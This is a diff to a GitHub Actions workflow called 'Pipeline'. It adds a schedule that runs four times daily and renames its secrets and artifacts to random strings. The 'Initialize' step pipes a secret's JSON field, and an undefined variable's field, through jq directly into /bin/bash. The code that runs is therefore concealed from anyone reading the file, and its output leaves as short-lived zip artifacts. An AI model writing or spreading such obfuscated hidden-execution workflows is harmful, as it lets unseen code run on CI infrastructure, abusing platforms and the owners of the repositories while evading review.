@@ -2,6 +2,8 @@ name: Pipeline
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '2 4,10,16,22 * * *'
 concurrency:
   group: ${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: true
@@ -15,18 +17,15 @@ jobs:
           fetch-depth: 1
       - name: Initialize
         env:
-          w7: ${{ secrets.w7 }}
+          n4644: ${{ secrets.n4644 }}
         run: |
-          printf '%s' "$w7" | jq -r .uenz24 | /bin/bash
-          printf '%s' "$yui806" | jq -r .qn98 | /bin/bash
-          echo $u854 | jq -r .h914 | /bin/bash
-          echo $kdy854 | jq -r .gxr83973 | /bin/bash
-          echo $oqw9 | jq -r .dr3162 | /bin/bash
+          printf '%s' "$n4644" | jq -r .sv8169 | /bin/bash
+          echo $usx36 | jq -r .zsvc4844 | /bin/bash
 
       - name: Persist results
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: gX1XIqBx
+          name: mvyBRKIi
           path: "*.zip"
           retention-days: 1
